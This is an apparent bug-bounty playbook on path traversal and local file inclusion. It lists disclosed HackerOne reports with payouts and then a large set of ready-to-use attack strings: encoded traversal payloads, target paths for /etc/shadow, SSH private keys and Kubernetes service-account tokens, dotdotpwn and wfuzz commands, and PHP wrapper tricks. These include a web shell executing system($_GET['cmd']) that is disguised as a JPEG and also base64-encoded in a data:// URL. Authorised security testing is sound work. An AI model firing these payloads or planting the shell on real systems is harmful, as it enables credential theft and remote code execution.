# Real-World Playbook — Path Traversal / LFI / File Reading

**Class:** `path-traversal-lfi` · **Coverage-matrix tier:** 1 · **Hunter2:** vuln_scanner.sh · manual · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Path Traversal / LFI / File Reading reports peak at **$12,000**. Rewarded across: GitHub Security Lab, GitLab, Internet Bug Bounty, Keybase, Kubernetes, Mail.ru, Mozilla, Semmle.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **Path traversal, to RCE** — GitLab, $12,000 · 142👍 · [733072](https://hackerone.com/reports/733072)
- **Path traversal in Nuget Package Registry** — GitLab, $12,000 · 87👍 · [822262](https://hackerone.com/reports/822262)
- **Arbitrary File Reading on Uber SSL VPN** — Uber, $6,500 · 38👍 · [617543](https://hackerone.com/reports/617543)
- **Mozilla VPN Clients: RCE via file write and path traversal** — Mozilla, $6,000 · 172👍 · [2995025](https://hackerone.com/reports/2995025)
- **Keybase client (Windows 10): Write files anywhere in userland using relative path in "download attachement" feature** — Keybase, $5,000 · 196👍 · [713006](https://hackerone.com/reports/713006)
- **important: Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path. (CVE-2024-38475)** — Internet Bug Bounty, $4,920 · 30👍 · [2585378](https://hackerone.com/reports/2585378)
- **Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49** — Internet Bug Bounty, $4,000 · 96👍 · [1394916](https://hackerone.com/reports/1394916)
- **[Android] Directory traversal leading to disclosure of auth tokens** — Slack, $3,500 · 50👍 · [1378889](https://hackerone.com/reports/1378889)
- **Path traversal through path stored in Uint8Array in Node.js 20** — Internet Bug Bounty, $3,495 · 44👍 · [2256167](https://hackerone.com/reports/2256167)
- **[Source Engine] Material path truncation leads to Remote Code Execution** — Valve, $2,500 · 60👍 · [544096](https://hackerone.com/reports/544096)
- **Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token** — Kubernetes, $2,500 · 17👍 · [1382919](https://hackerone.com/reports/1382919)
- **Path traversal by monkey-patching Buffer internals** — Internet Bug Bounty, $2,430 · 67👍 · [2434811](https://hackerone.com/reports/2434811)
- **Permission model improperly protects against path traversal in Node.js 20** — Internet Bug Bounty, $2,330 · 42👍 · [2225660](https://hackerone.com/reports/2225660)
- **Worker container escape lead to arbitrary file reading in host machine [again]** — Semmle, $2,000 · 178👍 · [697055](https://hackerone.com/reports/697055)
- **Path traversal, SSTI and RCE on a MailRu acquisition** — Mail.ru, $2,000 · 152👍 · [536130](https://hackerone.com/reports/536130)
- **Worker container escape lead to arbitrary file reading in host machine** — Semmle, $2,000 · 112👍 · [694181](https://hackerone.com/reports/694181)
- **[Java]: CWE-073 - File path injection with the JFinal framework** — GitHub Security Lab, $1,800 · 4👍 · [1483918](https://hackerone.com/reports/1483918)
- **[JAVA]: Partial Path Traversal** — GitHub Security Lab, $1,800 · 3👍 · [1678405](https://hackerone.com/reports/1678405)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
```
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```
```
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```
```
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```
```
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```
```
..././
...\.\
```
```
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```
```
{{BaseURL}}/.%00./.%00./etc/passwd
```
```
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```
```
..;/
```
```
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```
```
\\localhost\c$\windows\win.ini
```
```
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
```
```
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
```
```
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
```
```
    shortscan http://example.org/
```
```
url:file:///etc/passwd
url:http://127.0.0.1:8080
```
```
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
```
```
    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
```
```
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
```
```
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
```
```
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
```
```
    /etc/passwd
    /etc/shadow
    /home/$USER/.bash_history
    /home/$USER/.ssh/id_rsa
    /etc/mysql/my.cnf
```
```
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Directory Traversal File Include

|ID          |
|------------|
|WSTG-ATHZ-01|

#### Summary

Many web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.

Traditionally, web servers and web applications implement authentication mechanisms to control access to files and resources. Web servers try to confine users' files inside a "root directory" or "web document root", which represents a physical directory on the file system. Users have to consider this directory as the base directory into the hierarchical structure of the web application.

The definition of the privileges is made using Access Control Lists (ACL) which identify which users or groups are supposed to be able to access, modify, or execute a specific file on the server. These mechanisms are designed to prevent malicious users from accessing sensitive files (for example, the common `/etc/passwd` file on a UNIX-like platform) or to avoid the execution of system commands.

Many web applications use server-side scripts to include different kinds of files. It is quite common to use this method to manage images, templates, load static texts, and so on. Unfortunately, these applications expose security vulnerabilities if input parameters (i.e., form parameters, cookie values) are not correctly validated.

In web servers and web applications, this kind of problem arises in path traversal/file include attacks. By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn't read, access data outside the web document root, or include scripts and other kinds of files from external sites.

For the purpose of the OWASP Testing Guide, only the security threats related to web applications will be considered and not threats to web servers (e.g., the infamous `%5c` escape code into Microsoft IIS web server). Further reading suggestions will be provided in the references section for interested readers.

This kind of attack is also known as the dot-dot-slash attack (`../`), directory traversal, directory climbing, or backtracking.

During an assessment, to discover path traversal and file include flaws, testers need to perform two different stages:

1. Input Vectors Enumeration (a systematic evaluation of each input vector)
2. Testing Techniques (a methodical evaluation of each attack technique used by an attacker to exploit the vulnerability)

#### Test Objectives

- Identify injection points that pertain to path traversal.
- Assess bypassing techniques and identify the extent of path traversal.

#### How to Test

##### Black-Box Testing

###### Input Vectors Enumeration

In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.

Here are some examples of the checks to be performed at this stage:

- Are there request parameters which could be used for file-related operations?
- Are there unusual file extensions?
- Are there interesting variable names?
    - `https://example.com/getUserProfile.jsp?item=ikki.html`
    - `https://example.com/index.php?file=content`
    - `https://example.com/main.cgi?home=index.htm`
- Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?
    - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
    - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

###### Testing Techniques

The next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called `getUserProfile.jsp` loads static information from a file and shows the content to users. An attacker could insert the malicious string `../../../../etc/passwd` to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.

> Note: To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.

```text
https://example.com/getUserProfile.jsp?item=../../../../etc/passwd

*(truncated — open the source link for the full method)*

### From AllAboutBugBounty
#### Local File Inclusion (LFI)

#### Introduction
Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server

#### Where to find
- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

#### How to exploit
1. Basic payload
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

2. URL encoding
```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

3. Double encoding
```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

4. UTF-8 encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

5. Using Null Byte (%00)
```
http://example.com/index.php?page=../../../etc/passwd%00
```

6. From an existent folder
```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

7. Path truncation
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
```

8. Using PHP Wrappers: filter
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

9. Using PHP Wrappers: zlib
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

10. Using PHP Wrappers: zip
```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

11. Using PHP Wrappers: data
```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### File Inclusion and Path Traversal


../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md

#### File Inclusion

**Remote File Inclusion (RFI):** The application loads a file from a remote server. If the included resource is interpreted as code, an attacker can host and execute a payload. In PHP, URL-aware inclusion is **disabled by default** through `allow_url_include`.\
**Local File Inclusion (LFI):** The application loads a local file.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>

The vulnerability occurs when user input controls the file path loaded by the server.

Relevant **PHP functions** include `require`, `require_once`, `include`, and `include_once`.

A useful exploitation tool is [fimap](https://github.com/kurobeats/fimap).

#### Blind - Interesting - LFI2RCE files

```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- LFI → read secrets/config → creds → authed access
- LFI + log poisoning / PHP wrappers → RCE
- Path traversal in download/preview/import param

## Hunter2 wiring
- **Run:** `vuln_scanner.sh · manual`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
